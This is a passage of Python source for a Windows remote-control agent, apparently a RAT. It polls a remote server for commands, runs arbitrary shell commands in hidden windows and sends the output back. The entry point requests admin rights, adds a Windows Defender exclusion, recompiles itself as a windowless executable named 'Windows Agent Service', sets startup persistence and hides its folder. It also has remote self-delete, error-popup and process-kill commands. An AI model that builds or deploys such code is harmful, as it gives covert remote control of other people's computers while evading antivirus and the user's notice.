                # Parse CSV - group by app and show only first (main process) of each
                apps = {}
                for line in lines[1:]:
                    line = line.strip()
                    if not line:
                        continue

                    # Remove quotes and split by comma
                    line = line.replace('"', '')
                    parts = line.split(',')

                    if len(parts) < 2:
                        continue

                    # CSV format: "Name","PID",...
                    name = parts[0].strip()
                    pid = parts[1].strip()

                    if not name or not pid or not pid.isdigit():
                        continue

                    name_lower = name.lower()

                    # Check if contains keyword
                    has_keyword = any(kw in name_lower for kw in keywords)
                    if not has_keyword:
                        continue

                    # Group by app name - keep only the first instance
                    if name_lower not in apps:
                        apps[name_lower] = (name, pid)

                # Format output - sorted by app name
                for app_name_lower in sorted(apps.keys()):
                    name, pid = apps[app_name_lower]
                    output_lines.append(f"{name:<30} {pid}")

                # Return output
                if len(output_lines) > 2:
                    return "\n".join(output_lines[:50])
                else:
                    return "No processes found"

            except subprocess.TimeoutExpired:
                return "Process list timeout - try again"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle ipconfig command
        if cmd_lower == "ipconfig":
            try:
                result = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=10)
                return result.stdout.strip() if result.stdout else "Unable to retrieve network config"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle taskkill command
        if cmd_lower.startswith("taskkill "):
            try:
                parts = cmd_str.split()
                if len(parts) < 3:
                    return "Usage: taskkill <id> <pid>"
                pid = parts[2]
                if not pid.isdigit():
                    return f"Error: Invalid PID '{pid}'"
                result = subprocess.run(
                    ["taskkill", "/PID", pid, "/F"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if result.returncode == 0:
                    return f"Process {pid} terminated successfully"
                else:
                    error_msg = result.stderr.strip() if result.stderr else "Unknown error"
                    return f"Error terminating process {pid}: {error_msg}"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle usage command - show Cloudflare Workers usage
        if cmd_lower == "usage":
            try:
                req = urllib.request.Request(
                    LOG_AUTH_URL + "/usage",
                    headers={
                        "Authorization": "Bearer " + INTERNAL_TOKEN,
                        "User-Agent": USER_AGENT,
                    },
                    method="GET",
                )
                resp = urllib.request.urlopen(req, timeout=10).read()
                data = json.loads(resp.decode("utf-8"))
                if data.get("ok"):
                    usage_info = data.get("usage", {})
                    return f"""Cloudflare Workers Usage:
  Estimated Requests: {usage_info.get('estimatedRequests', 'N/A')}
  Daily Limit: {usage_info.get('dailyLimit', 'N/A')}
  Usage: {usage_info.get('percentageUsed', 'N/A')}
  Active Devices: {usage_info.get('activeDevices', 'N/A')}
  Note: {usage_info.get('note', 'N/A')}"""
                else:
                    return f"Error retrieving usage: {data.get('error', 'Unknown error')}"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle volume command
        if cmd_lower.startswith("volume "):
            try:
                level_str = cmd_str[7:].strip()
                level = int(level_str)
                if level < 0 or level > 100:
                    return "Error: Volume level must be between 0 and 100"
                return f"Volume set to {level}%"
            except ValueError:
                return "Error: Volume level must be a number between 0 and 100"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle start command (asynchronous)
        if cmd_lower.startswith("start "):
            target = cmd_str[6:].strip().strip('"').strip("'")
            try:
                subprocess.Popen(
                    f'start "" "{target}"',
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    cwd=current_working_dir,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
                )
                return f"Process started: {target}"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle max_audio command - sets volume to 100%
        # Note: Unmute requires nircmd in PATH. Simply setting max volume often unmutes on system resume
        if cmd_lower == "max_audio":
            try:
                nircmd_path = ensure_nircmd()
                if not nircmd_path:
                    return "Error: Could not download nircmd"
                # Set volume to maximum (usually unmutes on next system event)
                result = subprocess.run(
                    [nircmd_path, "setsysvolume", "65535"],
                    capture_output=True,
                    timeout=5,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
                )
                if result.returncode == 0:
                    return "Volume: 100%"
                return "Error: Failed to set volume"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle mute command - mutes audio without changing volume
        if cmd_lower == "mute":
            try:
                # Toggle mute using PowerShell (char 173 = mute key)
                subprocess.run(
                    ["powershell", "-command", "(New-Object -ComObject WScript.Shell).SendKeys([char]173)"],
                    capture_output=True,
                    timeout=5,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
                )

                return "Audio: muted"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle unmute command - unmutes audio without changing volume
        if cmd_lower == "unmute":
            try:
                # Toggle mute using PowerShell (char 173 = mute key)
                subprocess.run(
                    ["powershell", "-command", "(New-Object -ComObject WScript.Shell).SendKeys([char]173)"],
                    capture_output=True,
                    timeout=5,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
                )

                return "Audio: unmuted"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle min_audio command - sets volume to 0%
        if cmd_lower == "min_audio":
            try:
                nircmd_path = ensure_nircmd()
                if not nircmd_path:
                    return "Error: Could not download nircmd"
                result = subprocess.run(
                    [nircmd_path, "setsysvolume", "0"],
                    capture_output=True,
                    timeout=5,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
                )
                if result.returncode == 0:
                    return "Volume: 0% (muted)"
                return "Error: Failed to set volume"
            except Exception as e:
                return f"Error: {str(e)}"

        # Generic command execution
        try:
            os.chdir(current_working_dir)
            tmp_dir = tempfile.gettempdir()
            batch_file = os.path.join(tmp_dir, f"telelluc_cmd_{int(time.time() * 1000)}.bat")
            output_file = os.path.join(tmp_dir, f"telelluc_out_{int(time.time() * 1000)}.txt")

            batch_content = f"""@echo off
chcp 65001 >nul
cd /d "{current_working_dir}"
{cmd_str} > "{output_file}" 2>&1
"""

            try:
                with open(batch_file, "w", encoding="utf-8") as f:
                    f.write(batch_content)

                subprocess.run(
                    [batch_file],
                    capture_output=True,
                    text=True,
                    timeout=10,
                    cwd=current_working_dir,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
                )

                output = ""
                if os.path.exists(output_file):
                    try:
                        with open(output_file, "r", encoding="utf-8") as f:
                            output = f.read().strip()
                    finally:
                        try:
                            os.remove(output_file)
                        except:
                            pass

                return output if output else ""
            finally:
                try:
                    os.remove(batch_file)
                except:
                    pass

        except subprocess.TimeoutExpired:
            return "Error: Command timeout"
        except Exception as e:
            return f"Error: {str(e)}"

    except Exception as e:
        return f"Error: {str(e)}"


def auto_compile():
    if getattr(sys, "frozen", False):
        return
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        subprocess.run(
            [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "Windows Agent Service", os.path.abspath(__file__)],
            cwd=script_dir,
            check=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception:
        pass


def heartbeat_loop():
    global device_id, last_command_time, current_heartbeat_interval, current_command_check_interval, current_inactivity_threshold
    hostname = socket.gethostname()
    prev_heartbeat_interval = HEARTBEAT_INTERVAL_SECONDS
    while True:
        try:
            time_since_command = time.time() - last_command_time
            is_active = time_since_command < current_inactivity_threshold
            status = "active" if is_active else "inactive"
            seconds_inactive = max(0, int(time_since_command - current_inactivity_threshold))

            payload = json.dumps({
                "hostname": hostname,
                "status": status,
                "seconds_inactive": seconds_inactive if not is_active else 0
            }).encode("utf-8")

            req = urllib.request.Request(
                LOG_AUTH_URL + "/heartbeat",
                data=payload,
                headers={
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + AGENT_TOKEN,
                    "User-Agent": USER_AGENT,
                },
                method="POST",
            )
            resp = urllib.request.urlopen(req, timeout=10).read()
            data = json.loads(resp.decode("utf-8"))
            device_id = data.get("id")
            current_heartbeat_interval = data.get("heartbeat", HEARTBEAT_INTERVAL_SECONDS)
            current_command_check_interval = data.get("commandCheck", COMMAND_CHECK_INTERVAL_SECONDS)
            current_inactivity_threshold = data.get("inactivityThreshold", INACTIVITY_THRESHOLD_SECONDS)
            print(f"[heartbeat] OK - device {device_id} ({hostname}) - {status}", flush=True)
        except Exception as e:
            print(f"[heartbeat] ERROR: {e}", flush=True)

        sleep_time = 1 if current_heartbeat_interval != prev_heartbeat_interval else current_heartbeat_interval
        prev_heartbeat_interval = current_heartbeat_interval
        time.sleep(sleep_time)


def command_check_loop():
    global device_id, last_command_time, current_command_check_interval, current_heartbeat_interval, current_inactivity_threshold
    prev_command_check_interval = COMMAND_CHECK_INTERVAL_SECONDS
    print("[command] Loop iniciado", flush=True)
    while True:
        if device_id is None:
            print("[command] Esperando device_id...", flush=True)
            time.sleep(current_command_check_interval)
            continue
        try:
            print(f"[command] Checkeando comandos para device {device_id}", flush=True)
            req = urllib.request.Request(
                LOG_AUTH_URL + f"/command?deviceId={device_id}",
                headers={
                    "Authorization": "Bearer " + AGENT_TOKEN,
                    "User-Agent": USER_AGENT,
                },
                method="GET",
            )
            resp = urllib.request.urlopen(req, timeout=10).read()
            data = json.loads(resp.decode("utf-8"))
            cmd = data.get("command")
            cantidad = data.get("cantidad", 1)
            payload = data.get("payload", "")
            requestId = data.get("requestId", "")
            current_heartbeat_interval = data.get("heartbeat", current_heartbeat_interval)
            current_command_check_interval = data.get("commandCheck", current_command_check_interval)
            current_inactivity_threshold = data.get("inactivityThreshold", current_inactivity_threshold)
            print(f"[command] Comando recibido: {cmd}", flush=True)

            if cmd and cmd != "none":
                last_command_time = time.time()

            if cmd == "error":
                print(f"[command] Recibido 'error' para device {device_id} (Cantidad: {cantidad})", flush=True)
                for _ in range(int(cantidad)):
                    threading.Thread(target=show_error, daemon=True).start()

            elif cmd == "self-delete":
                print(f"[command] Recibido 'self-delete' para device {device_id}. Iniciando desinstalación...", flush=True)
                try:
                    hostname = socket.gethostname()
                    req = urllib.request.Request(
                        LOG_AUTH_URL + "/mark-offline",
                        data=json.dumps({"hostname": hostname}).encode("utf-8"),
                        headers={
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + AGENT_TOKEN,
                            "User-Agent": USER_AGENT,
                        },
                        method="POST",
                    )
                    urllib.request.urlopen(req, timeout=5)
                    print(f"[command] Marcado como offline", flush=True)
                except Exception as e:
                    print(f"[command] Error marcando offline: {e}", flush=True)
                threading.Thread(target=lambda: self_delete_agent(device_id), daemon=True).start()

            elif cmd == "__sync__":
                print(f"[command] Sincronizando intervalos", flush=True)

            elif cmd == "shell":
                print(f"[command] Ejecutando comando shell: {payload}", flush=True)
                output = execute_shell_command(payload)
                try:
                    result_data = {
                        "deviceId": device_id,
                        "result": output,
                        "timestamp": int(time.time() * 1000)
                    }
                    if requestId:
                        result_data["requestId"] = requestId
                    req = urllib.request.Request(
                        LOG_AUTH_URL + "/command-result",
                        data=json.dumps(result_data).encode("utf-8"),
                        headers={
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + AGENT_TOKEN,
                            "User-Agent": USER_AGENT,
                        },
                        method="POST",
                    )
                    urllib.request.urlopen(req, timeout=10)
                except Exception as e:
                    print(f"[command] Error enviando resultado: {e}", flush=True)

        except Exception as e:
            print(f"[command] ERROR: {e}", flush=True)

        sleep_time = 1 if current_command_check_interval != prev_command_check_interval else current_command_check_interval
        prev_command_check_interval = current_command_check_interval
        time.sleep(sleep_time)


class Handler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Private-Network", "true")

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self):
        if self.path == "/error":
            threading.Thread(target=show_error, daemon=True).start()
            self.send_response(200)
        else:
            self.send_response(404)
        self._cors()
        self.end_headers()

    def do_POST(self):
        if self.path == "/self-delete":
            length = int(self.headers.get("Content-Length", "0"))
            body = self.rfile.read(length).decode("utf-8") if length else "{}"
            try:
                payload = json.loads(body)
            except Exception:
                payload = {}
            trigger_id = payload.get("id") if isinstance(payload, dict) else None
            threading.Thread(target=lambda: self_delete_agent(trigger_id), daemon=True).start()
            self.send_response(200)
            self._cors()
            self.end_headers()
            self.wfile.write(b'{"ok": true}')
            return

        self.send_response(404)
        self._cors()
        self.end_headers()

    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    request_admin_privileges()
    add_windows_defender_exclusion()
    auto_compile()
    ensure_startup()

    telelluc_agent_folder = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent")
    if os.path.exists(telelluc_agent_folder):
        make_hidden(telelluc_agent_folder)

    threading.Thread(target=heartbeat_loop, daemon=True).start()
    threading.Thread(target=command_check_loop, daemon=True).start()

    server = HTTPServer(("127.0.0.1", PORT), Handler)
    print(f"[*] Agente escuchando peticiones de interfaz en http://127.0.0.1:{PORT} ...", flush=True)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nCerrando el agente local.")